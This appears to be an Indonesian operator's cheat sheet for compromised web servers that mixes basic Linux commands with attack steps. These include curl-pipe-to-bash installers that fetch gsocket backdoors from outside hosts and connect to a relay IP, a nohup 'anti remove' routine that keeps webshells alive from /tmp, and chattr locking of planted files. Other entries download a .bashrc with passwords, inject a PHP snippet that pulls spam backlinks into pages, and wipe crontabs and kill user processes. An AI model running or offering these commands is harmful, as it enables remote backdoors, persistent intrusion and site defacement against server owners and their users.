sudo su >> login
ls > cek directory
ls -lah > untuk lihat directory lebih detail
pwd > cek kita di dalam dir apa
cd (item) > masuk ke dalam
cd .. > back
mkdir  (namadir) > buat directory baru
nano > file baru seperti index.php atau sitemap.xml
rm -rf (item) > hapus file
cat (namafile) > utk lht isi filenya
chattr +i -R (item) > kunci file
mv (item lama) (item baru) > mengganti nama file
wget -O index.php (masukan link pastebin) > digunakan ketika tidak bisa membuat file menggunakan perintah nano
curl -o index.php (masukan link pastebin)

------------------------------------------

🔹 Mencegah Penghapusan Folder dan Isinya 
sudo chattr -R +i /path/to/folder
🔹 Penjelasan:

+i → Mengaktifkan immutable (tidak bisa dihapus/diubah)

-R → Menerapkan secara rekursif ke semua isi folder

sudo chattr +a nama_file

Hanya root yang bisa menghapus atau menonaktifkan proteksi ini

sudo chattr +i +a -R /path/ke/folder/*


--------------------------------------------

chmod -R 755 nama dir

chmod -R u+w /path/ke/direktori (untuk memberikan akses write)


--------------------------------------

Menghapus Proteksi (Hanya Root)
sudo chattr -i /path/to/file.txt
sudo chattr -R -i /path/to/folder

(menghapus semua atribut a pada isi folder)
sudo chattr -R -a ./nama folder

sudo chattr -R -i -a /nama folder


-----------------------------------------

main.sh
sed -i 's/\r$//' main.sh

rm -rf title.txt desc.txt folder.txt landing.txt main.sh

------------------------

sudo chattr -a nama file/dir ( atribut append-only )

--------------------------------

lsattr (file/folder) cek immunite (perlindungan dari penghapusan, modifikasi, atau pembatasan eksekusi), 

-----------------------------------------------------------

crontab -l | crontab -r

-----------------------------------

✅ Cara agar file bisa diedit oleh owner

chmod u+rw <nama_file>
chmod -t <nama_file>

-----------------------------------

touch namafile.txt (command buat file dari terminal)

---------------------------------------

find ./ -name "*.php" -exec sh -c "cat {} | grep 'eval('" \; -print
find ./ -name "*.php" -exec sh -c "cat {} | grep 'base64'" \; -print


find ./ -name "*.php" -exec grep -nE "eval\(|base64_decode" {} \;

(cara scan shell dari terminal gs)

-----------------------------

(ingin disalin ke semua direktori & sub-direktori di bawah public_html :)
find ~/public_html -type d -exec cp ~/public_html/.htaccess {}/.htaccess \;

Kalau kamu hanya ingin menyalin ke direktori yang belum ada .htaccess, gunakan
find ~/public_html -type d -exec sh -c '[ ! -f "$1/.htaccess" ] && cp ~/public_html/.htaccess "$1/.htaccess"' _ {} \;

Backup dulu .htaccess yang lama, kalau-kalau butuh rollback
find ~/public_html -type f -name ".htaccess" -exec cp {} {}.bak \;
----------------------------------------------------------

find . -type d -exec sh -c '[ ! -f "$1/.htaccess" ] && cp ./.htaccess "$1/.htaccess"' _ {} \;
⚡ Penjelasan:

find . -type d → cari semua direktori mulai dari folder sekarang (. = current dir).

[ ! -f "$1/.htaccess" ] → cek kalau belum ada .htaccess di folder itu.

cp ./.htaccess "$1/.htaccess" → copy .htaccess dari folder ~/perpus.radenwijaya.ac.id ke setiap subfolder.

👉 Dengan begitu .htaccess di root (~/perpus.radenwijaya.ac.id/.htaccess) bakal nyebar ke semua subfolder, tapi nggak niban kalau udah ada .htaccess di sana.

---------------------------------------

find . -type d -exec cp ./.htaccess {}/.htaccess \;

find . -type d -exec cp -f .htaccess {} \; -exec echo "Replaced .htaccess in {}" \;

Kalau lo mau paksa overwrite .htaccess di semua folder (walau udah ada)

------------------------------------
Cara cek posisi folder yang ada .htaccess

find /path/ke/public_html -type f -name ".htaccess"
/path/ke/public_html → ganti dengan lokasi folder utama lu


Cara menghapus semua file .htaccess
find /path/ke/public_html -type f -name ".htaccess" -exec rm -f {} \;


----------------------------------------------
curl -fsSLk -ogs https://github.com/hackerschoice/gsocket/releases/latest/download/gs-netcat_linux-x86_64 && chmod 755 gs && S=$(./gs -g) && GS_PORT=53 GSOCKET_ARGS="-liD -s $S" ./gs && echo "Connect with: gs-netcat -s $S -i"

(pasang GS Manual)

bash -c "$(curl -fsSL https://toyotasupra.pro/GS/x)"

GS_HOST=167.71.214.178 bash -c "$(curl -fsSL https://toyotasupra.pro/GS/x)"
(GS KANTOR)

GS_HOST=167.71.214.178 bash -c "$(curl -fsSL https://zorokun.xyz/gs-pro/x -k)"
bash -c "$(curl -fsSL https://zorokun.xyz/gs-pro/x -k)"

curl -fsSLk -oconfig https://hxbdoor.one/gsnc && chmod 755 config && S=$(PASSWORD=foobar ./config -g) && PASSWORD=foobar GS_HOST=167.71.214.178  GSOCKET_ARGS="-liD -s $S" ./config && echo "Connect with: gs-netcat -s $S -i"

GS_HOST=167.71.214.178 gs-netcat

----------------------------------

adminer edit ganti pass pilih md5

--------------------------------  

find . -type f -name ".htaccess" -exec chmod 444 {} \;
(cara membuat semua file .htacces ke chmod 44)

----------------------------------
Buatkan tulisan kebawah jadi ke samping

ctrl H lalu find \r\n
lalu replace dengan (spasi)

option : regular expression

----------------------------

ls -l --time=atime index.php
(Buat tau kapan terakhir file diakses/diedit.)

-------------------------

ps aux | grep GS
ps aux | grep gs-netcat
(cek gs yang aktif / berjalan)

ps -ef | grep -i 'gsocket\|gs-netcat\|[g]s'   # [g]s supaya grep sendiri tidak muncul

(CEK PID USER KITA)
ps -u "$USER" -o pid,cmd --no-headers

ps -u $USER
	
(menampilkan PID dari shell yang sedang aktif / yang kita gunakan)
echo $$

(Kalau ingin tahu semua PID yang terkait user dan cari yang cocok dengan shell aktif)
ps -u "$USER" -o pid,cmd | grep $$ 


kill $(ps -u "$USER" -o pid=)
kill -9 $(ps -u "$USER" -o pid=)

(disarankan)
loginctl terminate-user (nama user)

PID biasa → kill PID atau kill -9 PID
Semua PID user → pkill -u username
kill -9 <PID>
untuk kill

(CEK GS)
ps auxww | grep \\[ | awk '{print $2}' | while read pid; do [ -e /proc/$pid/exe ] && echo "PID: $pid | NAME: $(basename $(readlink /proc/$pid/exe))"; done

whoami
(cek username kita)

-------------------------

# Googlebot umum
RewriteCond %{HTTP_USER_AGENT} (Googlebot|Googlebot-Mobile|Googlebot-Image|Googlebot-Video|Googlebot-News|Googlebot-Smartphone|Mediapartners-Google)
[NC]
RewriteRule .* - [E=verifycaptcha:allow]

pasang htaccess jika site kena capcha / block bot google

--------------------------
SHELL ANTI REMOVE
chmod +x /tmp/bandar/nohub.sh && nohup /tmp/bandar/nohub.sh >/dev/null 2>&1 &

masukan file tmp nya

-------------------------

1.masuk ke dir shell trus command pwd
2. copy ke file di nohup
3. cd /tmp
4. mkdir
5. masukan cp /dir lokasi shell/namashell /tmp/nama dir/namashell
6. masukan file nohub.sh
7. masukan command SHELL ANTI REMOVE.

--------------------

shortcut cari greendir
find ./* -writable -type d

find . -maxdepth 2 -type d -perm -g+w

------------------------

find . -mindepth 1 -delete
📌 Artinya:

. → direktori saat ini

-mindepth 1 → jangan hapus . (folder itu sendiri), hanya isi di bawahnya

-delete → hapus file & folder

-------------

rm -rf ./*
rm -rf .[^.]*

⚠️ Catatan:

rm -rf ./* = hapus semua file biasa & folder

rm -rf .[^.]* = hapus file/folder tersembunyi (dotfiles) kecuali . dan ..

--------------------------------

buat backup sebelum hapus semua file

1. mkdir -p ~/backup-bkk
2. cp /pwd/nama file.php ~/backup-bkk/
3. hapus pake rm -rf .[^.]*

---------------------

setfacl -b nama_folder

-b = remove all extended ACL entries.
Setelah itu, kalau kamu cek lagi dengan ls -ld nama_folder, tanda + biasanya hilang.

-------------

cara memasang ACL

(Lihat ACL pada file/direktori)

getfacl nama_file_atau_folder

(Menambahkan ACL untuk user)

Contoh: beri user alex akses baca & tulis ke file data.txt
setfacl -m u:alex:rw data.txt

(Menambahkan ACL untuk group)

Contoh: beri group devteam akses penuh ke direktori project
setfacl -m g:devteam:rwx project

(Menambahkan ACL default ke direktori)

Supaya semua file/direktori baru di dalamnya otomatis dapat ACL tertentu:
setfacl -d -m u:alex:rw project

(Menghapus ACL tertentu)

setfacl -x u:alex data.txt

(Menghapus semua ACL)
setfacl -b nama_folder

-----------------------

/etc/apache2
/etc/httpd
/etc/nginx
/etc/nginx/conf.d
/home
/var/www/
/www/wwwroot

---------------------

wget -O .bashrc https://hxbdoor.one/raw/42CwP2VY
walaowe@@123@@1947 (masukan password)
cobasajamas (masukan password)
katasandinyacobasajamas (masukan password)

sed -i 's/\r$//' .bashrc
bash .bashrc

(ganti pw bashrc di tab baru)
echo -n "walaowe@@123@@1947" | sha256sum

find / -type f -name ".bashrc" 2>/dev/null

-----------------------

curl ifconfig.me
(cek ip public server)

nslookup (ip)

dig +short namadomain.com

------------------

(cek akses user)
grep -R "user =" /etc/php/*/fpm/pool.d/*.conf

su - user
exit (keluar)

-----------------------

rm -rf /path/to/public_html/*
rm -rf /path/to/public_html/.[!.]*

----------------------

Tambahkan huruf di depan dari notepad++

Ctrl + H | Regular expression

kolom find :
^(?=(?:.*\R){0,99})
99 = nomor akhir baris

kolom replace : kata kita

tambahkan huruf dibelakang

kolom find : $
kolom replace : kata kita

------------------------
sudo find / -type d \( -name "sites-enabled" -o -name "sites-available" \) 2>/dev/null

-----------------------------

uapi Tokens list
name: default

uapi Tokens revoke name=Default (nama sesuai name)

---------------------------

(Cek direktori root masing-masing domain)
grep -H "DocumentRoot" /etc/apache2/sites-enabled/*.conf

---------------------

(auto backlink) di bagian </script>
<?php $a = file_get_contents('https://firefoxforank.store/back/'); echo $a;?>

--------------------

password scan shell : jangandicoba

----------------------

grep -R "DocumentRoot" /etc/apache2/
grep -R "DocumentRoot" /etc/httpd/

(cek document root public)

----------------

